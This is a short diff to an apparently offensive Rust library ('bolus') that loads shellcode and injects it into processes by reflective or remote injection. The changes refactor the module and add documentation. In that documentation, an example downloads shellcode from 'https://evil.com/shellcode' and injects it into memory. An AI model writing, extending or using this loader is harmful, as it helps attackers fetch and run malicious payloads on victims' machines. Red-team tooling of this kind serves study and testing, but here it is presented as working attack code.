@@ -1,5 +1,6 @@
-mod injectors;
+pub mod injectors;
 use injectors::{
+    Injector,
     InjectionType::{
         self,
         Reflect,
@@ -16,14 +17,29 @@ use injectors::{
     decode_b64_shellcode,
     remote_inject,
     reflective_inject,
-    write_mem
 };
 
-pub struct Injector {
-    shellcode: Vec<u8>
-}
 
 
+///
+/// Creates an [Injector] to store our shellcode at runtime.
+/// 
+/// ```
+/// use bolus::{
+///     load,
+///     inject,
+///     injectors::{
+///         InjectionType,
+///         Injector,
+///         InjectorType
+///     }
+/// };
+/// let injection_type = InjectionType::Reflect;
+/// let injector_type = InjectorType::Url("https://evil.com/shellcode".to_string());
+/// let injector: Injector = load(injector_type).unwrap();
+/// inject(injector, injection_type, false).unwrap();
+/// ```
+/// 
 pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
     match injector_type {
         Embedded(shellcode) =>  Ok(Injector { shellcode }),
@@ -52,6 +68,12 @@ pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
     }
 }
 
+///
+/// Performs the shellcode injection. Strategy is determined by
+/// `injection_type`. `wait` determines whether 
+/// [windows::Windows::Win32::System::Threading::WaitForSingleObject()] 
+/// will be used. Useful if the app does not have an infinite main loop.
+/// 
 pub fn inject(injector: Injector, injection_type: InjectionType, wait: bool) -> Result<(), String> {
     return match injection_type {
         Reflect => unsafe { reflective_inject(&injector.shellcode, wait) },
